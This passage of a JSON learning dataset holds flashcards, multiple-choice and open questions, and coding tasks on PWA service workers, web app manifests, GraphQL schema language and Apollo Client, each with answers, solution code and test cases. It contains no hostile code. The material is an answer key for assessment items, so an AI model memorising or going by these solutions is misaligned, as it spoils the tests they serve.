          "analysisPoints": [
            "Correctly uses `caches.match` to check the cache.",
            "Implements the conditional logic for cache hit/miss.",
            "Correctly falls back to `fetch(event.request)` for network requests.",
            "Understands the structure of `event.respondWith`."
          ],
          "keyConcepts": [
            "Service Worker",
            "Fetch Event",
            "Caching Strategy",
            "Promises",
            "caches API"
          ],
          "evaluationCriteria": [
            "Functional correctness of the caching strategy.",
            "Syntactic correctness of JavaScript code.",
            "Adherence to the 'Cache First, then Network' pattern."
          ],
          "example": "This solution correctly implements the 'Cache First, then Network Fallback' strategy, which is fundamental for providing offline capabilities in PWAs. It ensures that previously visited content loads instantly when offline, while new content is fetched when online.",
          "tags": [
            "PWA",
            "Service Worker",
            "Coding",
            "Caching"
          ],
          "prerequisites": [
            "JavaScript Promises",
            "Service Worker basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_pwa_service_worker_6",
          "topic": "PWA Service Workers",
          "level": "easy",
          "type": "flashcard",
          "question": "In a Service Worker, what is the role of `CACHE_NAME`?",
          "answer": "It is a string identifier used to version and manage different caches. When the `CACHE_NAME` changes, it signals that new assets should be cached and old ones potentially removed.",
          "options": [],
          "analysisPoints": [
            "Understands that `CACHE_NAME` is for versioning.",
            "Recognizes its role in cache management."
          ],
          "keyConcepts": [
            "Service Worker",
            "Cache Naming",
            "Versioning"
          ],
          "evaluationCriteria": [
            "Accuracy",
            "Conciseness"
          ],
          "example": "",
          "tags": [
            "PWA",
            "Service Worker",
            "Caching"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_graphql_schema_1",
          "topic": "GraphQL Schema Definition Language (SDL)",
          "level": "easy",
          "type": "flashcard",
          "question": "In GraphQL SDL, what does the exclamation mark `!` after a type (e.g., `String!`) signify?",
          "answer": "It signifies that the field is non-nullable, meaning it will always return a value and cannot be `null`.",
          "options": [],
          "analysisPoints": [
            "Understands the non-nullable syntax in GraphQL SDL.",
            "Knows its implication for data integrity."
          ],
          "keyConcepts": [
            "GraphQL SDL",
            "Non-nullable",
            "Type System"
          ],
          "evaluationCriteria": [
            "Accuracy",
            "Conciseness"
          ],
          "example": "",
          "tags": [
            "GraphQL",
            "SDL",
            "Basics"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_graphql_schema_2",
          "topic": "GraphQL Schema Definition Language (SDL)",
          "level": "medium",
          "type": "mcq",
          "question": "Given the following GraphQL schema snippet:\n\n```graphql\ntype User {\n  id: ID!\n  name: String!\n  friends: [User!]!\n}\n\ntype Query {\n  user(id: ID!): User\n}\n```\n\nWhat does `friends: [User!]!` indicate about the `friends` field on the `User` type?",
          "answer": "It is a non-nullable list of non-nullable `User` objects.",
          "options": [
            "It is a nullable list of nullable `User` objects.",
            "It is a nullable list of non-nullable `User` objects.",
            "It is a non-nullable list of nullable `User` objects.",
            "It is a non-nullable list of non-nullable `User` objects."
          ],
          "analysisPoints": [
            "Correctly interprets the `[]` syntax for lists.",
            "Correctly interprets the `!` inside the brackets for non-nullable list items.",
            "Correctly interprets the `!` outside the brackets for non-nullable list itself.",
            "Demonstrates understanding of GraphQL type modifiers."
          ],
          "keyConcepts": [
            "GraphQL SDL",
            "Lists",
            "Non-nullable",
            "Type System"
          ],
          "evaluationCriteria": [
            "Accurate interpretation of type modifiers.",
            "Understanding of nested nullability."
          ],
          "example": "The outer `!` (`[User!]!`) means the `friends` list itself cannot be null. The inner `!` (`[User!]`) means that each individual `User` object within the `friends` list cannot be null.",
          "tags": [
            "GraphQL",
            "SDL",
            "Types"
          ],
          "prerequisites": [
            "GraphQL SDL basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_graphql_schema_3",
          "topic": "GraphQL Schema Definition Language (SDL)",
          "level": "medium",
          "type": "open",
          "question": "In a GraphQL schema, what are the primary responsibilities of the `Query` and `Mutation` root types? Provide an example for each.",
          "answer": "The `Query` and `Mutation` types are special root operation types in a GraphQL schema that define the entry points for interacting with the API.\n\n*   **`Query` Type**: The `Query` type defines all the operations that clients can use to **read or fetch data** from the server. It's analogous to GET requests in REST APIs. Each field defined on the `Query` type represents a top-level query that a client can perform. Query fields can accept arguments to filter or specify the data to be retrieved.\n    *   **Example:**\n        ```graphql\ntype Query {\n  user(id: ID!): User # Fetches a single user by ID\n  allPosts: [Post!]! # Fetches a list of all posts\n}\n        ```\n\n*   **`Mutation` Type**: The `Mutation` type defines all the operations that clients can use to **write, modify, or delete data** on the server. It's analogous to POST, PUT, DELETE requests in REST APIs. Each field on the `Mutation` type represents a distinct data modification operation. Mutation fields typically take input arguments for the data to be created/updated and return the modified object (or a relevant status).\n    *   **Example:**\n        ```graphql\ntype Mutation {\n  createUser(name: String!, email: String!): User! # Creates a new user\n  deletePost(id: ID!): Boolean! # Deletes a post and returns a boolean status\n}\n        ```\n\nIn essence, `Query` is for retrieving data without side effects, while `Mutation` is for operations that change server-side data.",
          "options": [],
          "analysisPoints": [
            "Clearly defines the purpose of `Query` (read) and `Mutation` (write/modify).",
            "Provides clear and syntactically correct GraphQL SDL examples for both.",
            "Draws a comparison to REST API equivalents (GET vs. POST/PUT/DELETE).",
            "Explains the role of arguments and return types."
          ],
          "keyConcepts": [
            "GraphQL Schema",
            "Query Type",
            "Mutation Type",
            "Data Operations",
            "SDL"
          ],
          "evaluationCriteria": [
            "Accuracy and completeness of definitions.",
            "Quality and relevance of examples.",
            "Understanding of API design principles."
          ],
          "example": "",
          "tags": [
            "GraphQL",
            "SDL",
            "Query",
            "Mutation",
            "API Design"
          ],
          "prerequisites": [
            "Basic API concepts"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_graphql_schema_4",
          "topic": "GraphQL Schema Definition Language (SDL)",
          "level": "easy",
          "type": "flashcard",
          "question": "What are the five built-in scalar types in GraphQL?",
          "answer": "ID, String, Int, Float, Boolean.",
          "options": [],
          "analysisPoints": [
            "Recalls the fundamental GraphQL scalar types.",
            "Differentiates them from custom object types."
          ],
          "keyConcepts": [
            "GraphQL",
            "Scalar Types",
            "SDL"
          ],
          "evaluationCriteria": [
            "Accuracy",
            "Completeness"
          ],
          "example": "",
          "tags": [
            "GraphQL",
            "SDL",
            "Types"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_graphql_schema_5",
          "topic": "GraphQL Schema Definition Language (SDL)",
          "level": "medium",
          "type": "code",
          "question": "Define a new GraphQL `type` called `Product` with the following fields:\n*   `id`: a non-nullable ID.\n*   `name`: a non-nullable String.\n*   `price`: a non-nullable Float.\n*   `description`: a nullable String.\n*   `category`: a non-nullable String.\n\nThen, add a `Query` field to fetch a single `Product` by its `id` and another `Query` field to fetch all `Product` objects.",
          "answer": "```graphql\ntype Product {\n  id: ID!\n  name: String!\n  price: Float!\n  description: String\n  category: String!\n}\n\ntype Query {\n  product(id: ID!): Product\n  allProducts: [Product!]!\n}\n```",
          "options": [],
          "analysisPoints": [
            "Correctly defines a new GraphQL object type (`Product`).",
            "Applies non-nullable (`!`) and nullable types correctly.",
            "Uses appropriate scalar types (`ID`, `String`, `Float`).",
            "Correctly defines `Query` fields for single and list retrieval.",
            "Applies non-nullable and list modifiers to `Query` return types."
          ],
          "keyConcepts": [
            "GraphQL SDL",
            "Object Types",
            "Scalar Types",
            "Non-nullable",
            "Lists",
            "Query Type"
          ],
          "evaluationCriteria": [
            "Syntactic correctness of GraphQL SDL.",
            "Adherence to field requirements and nullability.",
            "Correct implementation of `Query` operations."
          ],
          "example": "This solution correctly defines the `Product` type with specified fields and their nullability. It also adds standard `Query` operations for retrieving a single product by `ID` and a list of all products, demonstrating foundational schema design.",
          "tags": [
            "GraphQL",
            "SDL",
            "Coding",
            "Schema Design"
          ],
          "prerequisites": [
            "GraphQL SDL basics"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_graphql_schema_6",
          "topic": "GraphQL Schema Definition Language (SDL)",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary benefit of using a strong type system like GraphQL SDL for an API?",
          "answer": "It provides a clear contract between the client and server, enabling self-documentation, validation, and powerful tooling (like auto-completion and error checking) for both frontend and backend development.",
          "options": [],
          "analysisPoints": [
            "Identifies the contract aspect.",
            "Lists key benefits like documentation and tooling."
          ],
          "keyConcepts": [
            "GraphQL",
            "Type System",
            "API Contract",
            "Tooling",
            "Documentation"
          ],
          "evaluationCriteria": [
            "Accuracy",
            "Completeness of benefits"
          ],
          "example": "",
          "tags": [
            "GraphQL",
            "SDL",
            "Benefits"
          ],
          "prerequisites": [],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_graphql_apollo_client_1",
          "topic": "GraphQL Client: Apollo Client",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the main purpose of `ApolloClient` in a frontend application?",
          "answer": "It is a comprehensive state management library for JavaScript that enables fetching, caching, and modifying application data with GraphQL, and automatically updating the UI.",
          "options": [],
          "analysisPoints": [
            "Understands `ApolloClient`'s role as a GraphQL client.",
            "Identifies its core functionalities (fetching, caching, UI updates)."
          ],
          "keyConcepts": [
            "Apollo Client",
            "GraphQL Client",
            "Data Fetching",
            "State Management"
          ],
          "evaluationCriteria": [
            "Accuracy",
            "Completeness"
          ],
          "example": "",
          "tags": [
            "GraphQL",
            "Apollo Client",
            "Basics"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_graphql_apollo_client_2",
          "topic": "GraphQL Client: Apollo Client",
          "level": "medium",
          "type": "mcq",
          "question": "Which component of `ApolloClient` is primarily responsible for storing the results of GraphQL queries, reducing network requests, and providing instant UI updates for frequently accessed data?",
          "answer": "`InMemoryCache`",
          "options": [
            "`gql` tag",
            "`uri` property",
            "`InMemoryCache`",
            "`ApolloLink`"
          ],
          "analysisPoints": [
            "Identifies the caching mechanism within Apollo Client.",
            "Understands the benefits of client-side caching.",
            "Differentiates `InMemoryCache` from other Apollo Client components."
          ],
          "keyConcepts": [
            "Apollo Client",
            "InMemoryCache",
            "Caching",
            "Performance",
            "UI Updates"
          ],
          "evaluationCriteria": [
            "Correct identification of the caching component.",
            "Understanding of its function and benefits."
          ],
          "example": "The `InMemoryCache` stores GraphQL query results in a normalized, in-memory format. This allows Apollo Client to serve data from the cache directly if available, avoiding unnecessary network requests and making the application feel faster and more responsive.",
          "tags": [
            "GraphQL",
            "Apollo Client",
            "Caching"
          ],
          "prerequisites": [
            "Apollo Client basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_graphql_apollo_client_3",
          "topic": "GraphQL Client: Apollo Client",
          "level": "medium",
          "type": "open",
          "question": "You need to perform a GraphQL `Mutation` using `ApolloClient` to create a new post. Describe the steps involved, including how to define the mutation and how to execute it with variables.",
          "answer": "To perform a GraphQL `Mutation` using `ApolloClient` to create a new post, you would follow these steps:\n\n1.  **Define the GraphQL Mutation:** First, you need to define the GraphQL mutation string using the `gql` template literal tag. This string specifies the `mutation` operation, its name (e.g., `CreatePost`), the input variables it expects, and the fields you want to receive back from the server after the mutation is successful.\n    ```typescript\n    import { gql } from '@apollo/client';\n\n    const CREATE_POST_MUTATION = gql`\n      mutation CreatePost($title: String!, $content: String!, $authorId: ID!) {\n        createPost(title: $title, content: $content, authorId: $authorId) {\n          id\n          title\n          author {\n            name\n          }\n        }\n      }\n    `;\n    ```\n\n2.  **Execute the Mutation with `client.mutate()`:** Once the mutation is defined, you use the `client.mutate()` method provided by your `ApolloClient` instance. This method takes an object with the `mutation` property (set to your defined GraphQL mutation) and a `variables` property (an object containing the actual values for the mutation's input arguments).\n    ```typescript\n    import { ApolloClient, InMemoryCache } from '@apollo/client';\n\n    const client = new ApolloClient({\n      uri: 'https://api.example.com/graphql',\n      cache: new InMemoryCache()\n    });\n\n    // ... (CREATE_POST_MUTATION defined above)\n\n    client.mutate({\n      mutation: CREATE_POST_MUTATION,\n      variables: {\n        title: 'My First Post',\n        content: 'This is the content of my first post.',\n        authorId: '123'\n      }\n    })\n    .then(result => {\n      console.log('Post created:', result.data.createPost);\n      // Handle successful creation, e.g., update UI\n    })\n    .catch(error => {\n      console.error('Error creating post:', error);\n      // Handle error, e.g., display error message\n    });\n    ```\n\nThis process ensures that the mutation is correctly structured with its inputs and the expected outputs, and that it's sent to the GraphQL server via the Apollo Client instance.",
          "options": [],
          "analysisPoints": [
            "Explains how to define a GraphQL mutation using `gql`.",
            "Demonstrates passing variables to the mutation.",
            "Shows how to execute the mutation using `client.mutate()`.",
            "Includes error handling and success logging.",
            "Provides a coherent, step-by-step process."
          ],
          "keyConcepts": [
            "Apollo Client",
            "GraphQL Mutation",
            "gql tag",
            "Variables",
            "Client.mutate()",
            "Promises"
          ],
          "evaluationCriteria": [
            "Accuracy of the explanation.",
            "Correctness of code snippets.",
            "Completeness of the workflow.",
            "Understanding of mutation structure and execution."
          ],
          "example": "",
          "tags": [
            "GraphQL",
            "Apollo Client",
            "Mutation",
            "Coding"
          ],
          "prerequisites": [
            "GraphQL basics",
            "Apollo Client setup"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_graphql_apollo_client_4",
          "topic": "GraphQL Client: Apollo Client",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary function of the `gql` template literal tag in Apollo Client?",
          "answer": "It is used to parse GraphQL query, mutation, and subscription strings into a format that Apollo Client can understand, providing benefits like syntax highlighting and build-time validation.",
          "options": [],
          "analysisPoints": [
            "Identifies the role of `gql` for parsing.",
            "Lists associated benefits (syntax, validation)."
          ],
          "keyConcepts": [
            "Apollo Client",
            "gql tag",
            "GraphQL Syntax"
          ],
          "evaluationCriteria": [
            "Accuracy",
            "Conciseness"
          ],
          "example": "",
          "tags": [
            "GraphQL",
            "Apollo Client"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_graphql_apollo_client_5",
          "topic": "GraphQL Client: Apollo Client",
          "level": "medium",
          "type": "code",
          "question": "Write the JavaScript code to initialize an `ApolloClient` instance and then execute a GraphQL query to fetch the `id` and `name` of a `User` with a specific `id` (e.g., 'user123'). Use `InMemoryCache` and a mock URI `https://graphql.example.com/api`.",
          "answer": "```typescript\nimport { ApolloClient, InMemoryCache, gql } from '@apollo/client';\n\n// 1. Initialize Apollo Client\nconst client = new ApolloClient({\n  uri: 'https://graphql.example.com/api',\n  cache: new InMemoryCache()\n});\n\n// 2. Define the GraphQL Query\nconst GET_USER_BY_ID = gql`\n  query GetUser($userId: ID!) {\n    user(id: $userId) {\n      id\n      name\n    }\n  }\n`;\n\n// 3. Execute the Query with variables\nclient.query({\n  query: GET_USER_BY_ID,\n  variables: {\n    userId: 'user123'\n  }\n})\n.then(result => {\n  if (result.data && result.data.user) {\n    console.log('Fetched User:', result.data.user);\n  } else {\n    console.log('User not found or data is null.');\n  }\n})\n.catch(error => {\n  console.error('Error fetching user:', error);\n});\n```",
          "options": [],
          "analysisPoints": [
            "Correctly imports necessary components.",
            "Initializes `ApolloClient` with `uri` and `InMemoryCache`.",
            "Defines a parameterized GraphQL query using `gql`.",
            "Executes the query with `client.query()` and passes `variables` correctly.",
            "Includes basic promise handling (`.then`, `.catch`).",
            "Demonstrates understanding of data access from `result.data`."
          ],
          "keyConcepts": [
            "Apollo Client",
            "GraphQL Query",
            "gql tag",
            "Variables",
            "InMemoryCache",
            "Promises"
          ],
          "evaluationCriteria": [
            "Functional correctness of Apollo Client setup.",
            "Syntactic correctness of GraphQL query and JavaScript.",
            "Proper handling of query execution and results."
          ],
          "example": "This solution correctly demonstrates the full flow from Apollo Client initialization to executing a specific query with variables and handling its asynchronous result. This is a fundamental operation for any frontend application consuming a GraphQL API.",
          "tags": [
            "GraphQL",
            "Apollo Client",
            "Coding",
            "Query"
          ],
          "prerequisites": [
            "JavaScript Promises",
            "ES Modules",
            "GraphQL Query basics"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        }
      ],
      "tasks": [
        {
          "id": "task_pwa_manifest_1",
          "title": "Create a PWA Web App Manifest for a Recipe App",
          "description": "\nYour task is to create a `manifest.json` file for a simple 'Recipe Finder' Progressive Web App. The manifest should:\n\n1.  Set the `name` to \"Recipe Finder\" and `short_name` to \"Recipes\".\n2.  Provide a `description` like \"Discover and save your favorite recipes.\"\n3.  Set the `start_url` to the root path (`/`).\n4.  Specify the `display` mode as `standalone`.\n5.  Set `background_color` to `#f0f0f0` and `theme_color` to `#4CAF50` (a shade of green).\n6.  Include at least two `icons`: one `192x192` and one `512x512`, both PNGs. Assume their paths are `images/icon-192.png` and `images/icon-512.png` respectively.\n\nYour solution should be a complete and valid JSON object.",
          "difficulty": "medium",
          "startingCode": "{\n  // TODO: Fill in the manifest properties\n  // \"name\": \"\",\n  // \"short_name\": \"\",\n  // ...\n}",
          "solutionCode": "{\n  \"name\": \"Recipe Finder\",\n  \"short_name\": \"Recipes\",\n  \"description\": \"Discover and save your favorite recipes.\",\n  \"start_url\": \"/\",\n  \"display\": \"standalone\",\n  \"background_color\": \"#f0f0f0\",\n  \"theme_color\": \"#4CAF50\",\n  \"icons\": [\n    {\n      \"src\": \"images/icon-192.png\",\n      \"sizes\": \"192x192\",\n      \"type\": \"image/png\"\n    },\n    {\n      \"src\": \"images/icon-512.png\",\n      \"sizes\": \"512x512\",\n      \"type\": \"image/png\"\n    }\n  ]\n}",
          "testCases": [
            "The JSON must be valid.",
            "All required fields (`name`, `short_name`, `description`, `start_url`, `display`, `background_color`, `theme_color`, `icons`) must be present.",
            "The `display` mode must be `standalone`.",
            "The `icons` array must contain at least two entries with correct `src`, `sizes`, and `type`."
          ],
          "hints": [
            "Remember that the `icons` property is an array of objects.",
            "Ensure all string values are enclosed in double quotes as per JSON standard.",
            "Pay attention to the specific `sizes` and `type` requirements for icons."
          ],
          "tags": [
            "PWA",
            "Web App Manifest",
            "JSON",
            "Frontend"
          ],
          "timeEstimate": 20,
          "prerequisites": [
            "JSON basics"
          ],
          "complexity": 5,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Web Development",
            "Offline Capabilities"
          ]
        },
        {
          "id": "task_pwa_service_worker_1",
          "title": "Implement a Basic Service Worker for Offline Asset Caching",
          "description": "\nYour task is to implement a `service-worker.js` file that provides basic offline capabilities for a web application. The service worker should:\n\n1.  Define a `CACHE_NAME` (e.g., `'my-app-cache-v1'`).\n2.  Define an array `urlsToCache` including the root path (`/`), `index.html`, `main.css`, and `app.js`.\n3.  In the `install` event handler:\n    *   Use `event.waitUntil` to ensure the service worker isn't activated until caching is complete.\n    *   Open the defined cache.\n    *   Add all `urlsToCache` to the cache.\n4.  In the `fetch` event handler:\n    *   Implement the \"Cache First, then Network Fallback\" strategy.\n    *   Check if the requested resource exists in the cache.\n    *   If found, respond with the cached version.\n    *   If not found, fetch the resource from the network.\n\nProvide the complete JavaScript code for the `service-worker.js` file.",
          "difficulty": "medium",
          "startingCode": "const CACHE_NAME = 'my-app-cache-v1';\nconst urlsToCache = [\n  '/',\n  '/index.html',\n  '/main.css',\n  '/app.js'\n];\n\nself.addEventListener('install', event => {\n  // TODO: Implement caching logic here\n});\n\nself.addEventListener('fetch', event => {\n  // TODO: Implement cache-first, network-fallback strategy here\n});",
          "solutionCode": "const CACHE_NAME = 'my-app-cache-v1';\nconst urlsToCache = [\n  '/',\n  '/index.html',\n  '/main.css',\n  '/app.js'\n];\n\nself.addEventListener('install', event => {\n  console.log('[Service Worker] Installing...');\n  event.waitUntil(\n    caches.open(CACHE_NAME)\n      .then(cache => {\n        console.log('[Service Worker] Caching essential assets...');\n        return cache.addAll(urlsToCache);\n      })\n      .then(() => self.skipWaiting()) // Activates the new service worker immediately\n      .catch(error => console.error('[Service Worker] Caching failed:', error))\n  );\n});\n\nself.addEventListener('fetch', event => {\n  event.respondWith(\n    caches.match(event.request)\n      .then(response => {\n        if (response) {\n          console.log('[Service Worker] Serving from cache:', event.request.url);\n          return response;\n        }\n        console.log('[Service Worker] Fetching from network:', event.request.url);\n        return fetch(event.request);\n      })\n      .catch(error => {\n        console.error('[Service Worker] Fetch failed:', error);\n        // Optional: Return a fallback page for critical failures\n        // return caches.match('/offline.html');\n      })\n  );\n});\n\nself.addEventListener('activate', event => {\n  console.log('[Service Worker] Activating...');\n  event.waitUntil(\n    caches.keys().then(cacheNames => {\n      return Promise.all(\n        cacheNames.map(cacheName => {\n          if (cacheName !== CACHE_NAME) {\n            console.log('[Service Worker] Deleting old cache:', cacheName);\n            return caches.delete(cacheName);\n          }\n        })\n      );\n    })\n  );\n  event.waitUntil(clients.claim()); // Take control of clients immediately\n});",
          "testCases": [
            "The `install` event successfully adds all `urlsToCache` to the cache.",
            "The `fetch` event correctly serves cached resources when available.",
            "The `fetch` event falls back to network when resources are not in cache.",
            "The service worker file is syntactically correct JavaScript.",
            "Includes proper use of `event.waitUntil` and `event.respondWith`."
          ],
          "hints": [
            "Remember that `caches.open()` and `cache.addAll()` return Promises, so they should be chained with `.then()`.",
            "The `fetch` event handler needs to use `event.respondWith()` which expects a Promise that resolves to a `Response`.",
            "For the 'Cache First' strategy, `caches.match()` is key. Don't forget the fallback to `fetch(event.request)`."
          ],
          "tags": [
            "PWA",
            "Service Worker",
            "Caching",
            "Offline",
            "JavaScript"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "JavaScript Promises",
            "Web APIs"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Web App Manifest",
            "Network Requests",
            "Browser Storage"
          ]
        },
        {
          "id": "task_graphql_schema_1",
          "title": "Extend a GraphQL Schema for an E-commerce Platform",
          "description": "\nBuilding upon the provided `User` and `Post` types, extend the GraphQL schema for an e-commerce platform. You need to:\n\n1.  Define a new `type` called `Order` with the following fields:\n    *   `id`: non-nullable `ID`\n    *   `date`: non-nullable `String` (representing a date string, e.g., \"2023-10-27\")\n    *   `totalAmount`: non-nullable `Float`\n    *   `status`: non-nullable `String` (e.g., \"Pending\", \"Completed\", \"Shipped\")\n    *   `customer`: a non-nullable `User` type (linking an order to a user)\n2.  Add a `Query` field to `Query` type that allows fetching a single `Order` by its `id`.\n3.  Add another `Query` field to `Query` type that fetches a list of all `Order` objects.\n4.  Add a `Mutation` field to `Mutation` type for creating a new `Order`. It should take `date`, `totalAmount`, `status`, and `customerId` (`ID!`) as input, and return the newly created `Order`.\n\nYour solution should provide the complete GraphQL SDL for `Order` type, and the extended `Query` and `Mutation` types.",
          "difficulty": "hard",
          "startingCode": "type User {\n  id: ID!\n  name: String!\n  email: String!\n  posts: [Post!]!\n}\n\ntype Post {\n  id: ID!\n  title: String!\n  content: String!\n  author: User!\n}\n\ntype Query {\n  user(id: ID!): User\n  allUsers: [User!]!\n  post(id: ID!): Post\n  allPosts: [Post!]!\n  # TODO: Add Order Query fields here\n}\n\ntype Mutation {\n  createUser(name: String!, email: String!): User!\n  createPost(title: String!, content: String!, authorId: ID!): Post!\n  # TODO: Add Order Mutation fields here\n}\n\n# TODO: Define Order type here",
          "solutionCode": "type User {\n  id: ID!\n  name: String!\n  email: String!\n  posts: [Post!]!\n}\n\ntype Post {\n  id: ID!\n  title: String!\n  content: String!\n  author: User!\n}\n\n# New Order Type\ntype Order {\n  id: ID!\n  date: String!\n  totalAmount: Float!\n  status: String!\n  customer: User! # Link to the User type\n}\n\ntype Query {\n  user(id: ID!): User\n  allUsers: [User!]!\n  post(id: ID!): Post\n  allPosts: [Post!]!\n  order(id: ID!): Order # Query for single Order\n  allOrders: [Order!]! # Query for all Orders\n}\n\ntype Mutation {\n  createUser(name: String!, email: String!): User!\n  createPost(title: String!, content: String!, authorId: ID!): Post!\n  createOrder(date: String!, totalAmount: Float!, status: String!, customerId: ID!): Order! # Mutation to create a new Order\n}",
          "testCases": [
            "The `Order` type is correctly defined with all specified fields and correct nullability.",
            "The `customer` field in `Order` correctly references the `User` type.",
            "The `Query` type includes `order(id: ID!): Order`.",
            "The `Query` type includes `allOrders: [Order!]!`.",
            "The `Mutation` type includes `createOrder` with correct arguments and return type.",
            "The entire SDL is syntactically valid."
          ],
          "hints": [
            "Remember to correctly use `!` for non-nullable fields and `[]` for lists.",
            "When referencing another type (like `User` in `Order`), just use the type name.",
            "For `createOrder` mutation, consider what information is needed as input and what should be returned."
          ],
          "tags": [
            "GraphQL",
            "SDL",
            "Schema Design",
            "API",
            "Data Modeling"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "GraphQL SDL basics",
            "Understanding of Query and Mutation"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "Backend Development",
            "API Design",
            "Database Schemas"
          ]
        },
        {
          "id": "task_graphql_apollo_client_1",
          "title": "Set up Apollo Client and Execute a Mock Query and Mutation",
          "description": "\nYour task is to create a JavaScript environment (Node.js script or browser script) that sets up Apollo Client and demonstrates basic data fetching and modification capabilities against a mock GraphQL endpoint.\n\n1.  **Initialize Apollo Client**: Create an `ApolloClient` instance using `InMemoryCache` and a mock `uri` (e.g., `'https://mock-graphql-api.com/graphql'`).\n2.  **Define a Query**: Create a GraphQL query using the `gql` tag to fetch `id` and `name` for all users.\n    ```graphql\n    query {\n      allUsers {\n        id\n        name\n      }\n    }\n    ```\n3.  **Execute the Query**: Call `client.query()` with your defined query. Log the successful `data` or any `error`.\n4.  **Define a Mutation**: Create a GraphQL mutation using the `gql` tag to `createUser` with `name` and `email` variables. Request `id`, `name`, and `email` back.\n    ```graphql\n    mutation CreateUser($name: String!, $email: String!) {\n      createUser(name: $name, email: $email) {\n        id\n        name\n        email\n      }\n    }\n    ```\n5.  **Execute the Mutation**: Call `client.mutate()` with your defined mutation and example variables. Log the successful `data` or any `error`.\n\nSince this is a mock setup, the `uri` will not actually resolve to a live server. Focus on the correct structure and calls for `ApolloClient`.",
          "difficulty": "medium",
          "startingCode": "import { ApolloClient, InMemoryCache, gql } from '@apollo/client';\n\n// TODO: Initialize ApolloClient\n\n// TODO: Define GET_ALL_USERS query\n\n// TODO: Execute GET_ALL_USERS query\n\n// TODO: Define CREATE_USER_MUTATION\n\n// TODO: Execute CREATE_USER_MUTATION",
          "solutionCode": "import { ApolloClient, InMemoryCache, gql } from '@apollo/client';\n\n// 1. Initialize Apollo Client\nconst client = new ApolloClient({\n  uri: 'https://mock-graphql-api.com/graphql',\n  cache: new InMemoryCache() // The default cache for Apollo Client\n});\n\n// 2. Define a GraphQL Query\nconst GET_ALL_USERS = gql`\n  query {\n    allUsers {\n      id\n      name\n    }\n  }\n`;\n\n// 3. Execute the Query\nconsole.log('\\n--- Executing GET_ALL_USERS Query ---');\nclient.query({\n  query: GET_ALL_USERS\n})\n.then(result => {\n  console.log('Query result:', result.data);\n  // In a real app, result.data.allUsers would contain the user data\n})\n.catch(error => {\n  console.error('Error fetching users:', error.message);\n  // Expected error due to mock URI not resolving\n});\n\n// 4. Define a GraphQL Mutation\nconst CREATE_USER_MUTATION = gql`\n  mutation CreateUser($name: String!, $email: String!) {\n    createUser(name: $name, email: $email) {\n      id\n      name\n      email\n    }\n  }\n`;\n\n// 5. Execute the Mutation\nconsole.log('\\n--- Executing CREATE_USER_MUTATION ---');\nclient.mutate({\n  mutation: CREATE_USER_MUTATION,\n  variables: {\n    name: 'Alice Smith',\n    email: 'alice.smith@example.com'\n  }\n})\n.then(result => {\n  console.log('Mutation result:', result.data);\n  // In a real app, result.data.createUser would contain the new user data\n})\n.catch(error => {\n  console.error('Error creating user:', error.message);\n  // Expected error due to mock URI not resolving\n});",
          "testCases": [
            "ApolloClient is initialized with `uri` and `InMemoryCache`.",
            "The `GET_ALL_USERS` query is correctly defined using `gql`.",
            "The `client.query()` method is called for `GET_ALL_USERS`.",
            "The `CREATE_USER_MUTATION` is correctly defined using `gql` with variables.",
            "The `client.mutate()` method is called for `CREATE_USER_MUTATION` with example `variables`.",
            "Both `query` and `mutate` calls include `.then()` and `.catch()` for promise handling."
          ],
          "hints": [
            "Ensure you have `@apollo/client` installed (`npm install @apollo/client graphql`).",
            "The `gql` tag is essential for parsing your GraphQL strings.",
            "Remember that `client.query()` and `client.mutate()` return Promises.",
            "For mutations, don't forget to pass the `variables` object."
          ],
          "tags": [
            "GraphQL",
            "Apollo Client",
            "Frontend",
            "Data Fetching",
            "Mutation",
            "Query",
            "JavaScript"
          ],
          "timeEstimate": 50,
          "prerequisites": [
            "JavaScript Promises",
            "ES Modules"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "relatedConcepts": [
            "API Integration",
            "State Management",
            "Async JavaScript"
          ]
        }
      ]
    }
  },
  {
    "id": "aa13ee3a-31c9-4cb0-9751-8af930ef54cd",
    "startLine": 13200,
    "endLine": 13299,
    "processedDate": "2025-06-17T13:21:38.360Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_graphql_client_operations",
          "title": "GraphQL Client: Queries and Mutations",
